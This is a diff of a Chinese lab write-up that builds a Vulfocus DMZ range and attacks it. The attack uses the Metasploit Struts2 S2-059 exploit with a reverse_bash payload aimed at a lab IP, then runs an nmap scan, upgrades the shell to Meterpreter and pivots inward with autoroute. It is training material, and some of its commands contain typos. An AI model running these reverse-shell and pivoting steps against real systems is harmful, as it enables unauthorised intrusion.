@@ -28,46 +28,33 @@ sudo tee /etc/apt/sources.list.d/docker.list
 
 ## Vulfocus搭建
 
+如果出现了Vuldocus无法登录的情况，出现以下错误：
 
+![](./img/登录报错.png)
 
+呢么需要进入vulfocus的容器，执行下面的命令启动redis服务：
 
-## 
+```bash
+redis-service
+```
 
-
-
-## 
-
-
-
-##
-
-
-
-##
-
-
-
-##
-
-
-
-##
-
-
+![](./img/登录报错解决方法.png)
 
 ## DMZ环境搭建
 
 在之前成功运行的Vulfocus的基础上进行操作
+
 ### 网卡创建
+
 首先根据下面的步骤依次建立两个网卡,网卡的名称任意，子网和网关不和虚拟机网卡重复即可
 
 ![](./img/添加网卡操作.png)
 
 ### DMZ场景编排
 
-由于直接导入场景编排的压缩包失败，所以需要手动去编排一个场景，这里可以参考原先的场景编排压缩包中的内容进行操作，对`DMZ.zip`解压后可以发现，其中包含了去创建一个场景所需的所有信息，包括网卡信息和镜像配置等信息
+由于直接导入场景编排的压缩包失败，所以需要手动去编排一个场景，这里可以参考原先的场景编排压缩包中的内容进行操作，对 `DMZ.zip`解压后可以发现，其中包含了去创建一个场景所需的所有信息，包括网卡信息和镜像配置等信息
 
-可以直接通过对`raw-content.json`这个文件格式化查看，也可以通过`jq`和`grep`查找需要的内容。
+可以直接通过对 `raw-content.json`这个文件格式化查看，也可以通过 `jq`和 `grep`查找需要的内容。
 
 首先确定需要的镜像有哪些：
 
@@ -75,25 +62,28 @@ sudo tee /etc/apt/sources.list.d/docker.list
 cat raw-content.json | jq . | grep image_name
 ```
 
-即查看文件中与`image_name`相关的内容有哪些：
+即查看文件中与 `image_name`相关的内容有哪些：
 
 ![](./img/dmz安装镜像.png)
 
 可知需要安装是三个不同的镜像文件：
+
 ```
 vulshare/nginx-php-flag:latest
 vulfocus/struts2-cve_2020_17530:latest
 vulfocus/weblogic-cve_2019_2725:latest
 ```
+
 其中第一个镜像存在运行问题，需要替换为:
+
 ```
 c4pr1c3/vulshare_nginx-php-flag
 ```
 
 这里有两种安装的方法：
 
-* 第一种是通过Vulfocus的GUI界面安装，它会直接调用`docker pull`拉取镜像
-* 第二种事直接手动在命令行执行`docker pull`拉取镜像，然后再通过Vulfocus的GUI界面将本地镜像添加进取
+* 第一种是通过Vulfocus的GUI界面安装，它会直接调用 `docker pull`拉取镜像
+* 第二种事直接手动在命令行执行 `docker pull`拉取镜像，然后再通过Vulfocus的GUI界面将本地镜像添加进取
 
 完成镜像拉取后，可以在下面的页面进行编排，详情如下：
 
@@ -105,44 +95,57 @@ c4pr1c3/vulshare_nginx-php-flag
 
 ### 流量捕获配置
 
-在启动了场景之后，可以通过下面的命令开启对`struts2-cve_2020_17530`的流量捕获
+在启动了场景之后，可以通过下面的命令开启对 `struts2-cve_2020_17530`的流量捕获
+
 ```bash
 container_name="<替换为目标容器名称或ID>"
 docker run --rm --net=container:${container_name} -v ${PWD}/tcpdump/${container_name}:/tcpdump kaazing/tcpdump
 ```
 
-该命令在当前路径下创建了一个`tcpdump`目录，并且将对指定容器监控的流量捕获到目录中
+该命令在当前路径下创建了一个 `tcpdump`目录，并且将对指定容器监控的流量捕获到目录中
 
 ## DMZ 入口靶标
 
 入口靶标页面如下，记录目标ip和端口号
 
 ![](./img/入口靶标.png)
- 
-进入攻击机，更新并初始化`metasploit`
+
+进入攻击机，更新并初始化 `metasploit`
 
 ```bash
 sudo apt install -y metasploit-framework
 sudo msfdb init
 ```
+
 检查数据库连接情况并创建工作区准备攻击：
+
+```bash
+db_status
+workspace - a vulfoucus
+```
 
 ![](./img/检查状态与创建工作目录.png)
 
-由于已经知道了漏洞为`struts2代码执行漏洞`，所以进行相关搜索搜索：
+由于已经知道了漏洞为 `struts2代码执行漏洞`，所以进行相关搜索搜索：
+
 ```bash
 search struts2 type:exploit
 search S2-059 type:exploit
 ```
-使用`info`可以指定序号或名称查看详情
+
+使用 `info`可以指定序号或名称查看详情
+
 ```bash
 info 0
 ```
-使用`use`可以使用指定的exp
+
+使用 `use`可以使用指定的exp
+
 ```bash
 use 0
 ```
-使用`show options`可以查看exp的详细参数配置,使用`show payloads`可以查看可用 exp payloads：
+
+使用 `show options`可以查看exp的详细参数配置,使用 `show payloads`可以查看可用 exp payloads：
 
 ```bash
 show options
@@ -151,12 +154,12 @@ show payloads
 
 ![](./img/查看payload.png)
 
-选择一个需要的`payload`使用并根据参数列表的内容修改靶机和攻击机的参数
+选择一个需要的 `payload`使用并根据参数列表的内容修改靶机和攻击机的参数
 
 ```bash
 set payload payload/cmd/unix/reverse_bash   #设置payload
 set RHOSTS 192.168.131.10   #靶机IP
-set rport  30947    #靶机目标端口    
+set rport  30947    #靶机目标端口  
 set LHOST  192.168.131.6   #攻击者主机IP 
 ```
 
@@ -165,13 +168,15 @@ set LHOST  192.168.131.6   #攻击者主机IP
 ![](./img/检查参数设置.png)
 
 执行攻击，如果攻击成功，按照payload的内容可以获得靶机的shell:
+
 ```bash
 run -j 
 ```
 
 ![](./img/靶口获得shell.png)
 
-使用`sessions`命令查看列表，打开`shell`执行命令
+使用 `sessions`命令查看列表，打开 `shell`执行命令
+
 ```bash
 sessions -l
 sessions -i 2
@@ -179,9 +184,50 @@ sessions -i 2
 
 ![](./img/攻破靶口.png)
 
-
 得到flag
 
-## 
+## 内网第一层靶标
 
+ctrl-z将session放入后台
 
+对要攻击的目标进行扫描：
+
+```bash
+db_nmap -p 60990,80,22 192.168.131.10 -A -T4 -n
+```
+
+![](./img/端口扫描.png)
+
+可以看出在扫描前 `hosts`的内容只有一个之前指定的ip地址，扫描的结果显示发现了22,80,60990均为开放端口
+
+扫描过后再次查看 `hosts`和 `services`情况
+
+![](./img/内容更新.png)
+
+发现 `hosts`中的内容得到了补全，并且 `services`中的内容得到了扩充
+
+![](./img/)
+
+升级shell为Meterpreter Shell
+
+![](./img/升级shell.png)
+
+进入升级后的shell并查看当前网络的情况：
+
+![](./img/查看网卡.png)
+
+![](./img/查看route和arp.png)
+
+发现入口靶机的内部地址为 `192.170.84.3`并且发现有一个新的网段 `192.170.84.0/24`
+
+接下来需要使用到**autoroute**
+
+> MSF的autoroute模块是MSF框架中自带的一个路由转发功能，实现过程是MSF框架在已经获取的Meterpreter Shell的基础上添加一条去往“内网”的路由，直接使用MSF去访问原本不能直接访问的内网资源.
+
+![](./img/)
+
+## 内网第二层靶标
+
+参考资料：
+
+[利用msf自带的route模块穿透目标内网 - Guko&#39;s Blog](https://pingmaoer.github.io/2020/05/09/%E5%88%A9%E7%94%A8msf%E8%87%AA%E5%B8%A6%E7%9A%84route%E6%A8%A1%E5%9D%97%E7%A9%BF%E9%80%8F%E7%9B%AE%E6%A0%87%E5%86%85%E7%BD%91/)
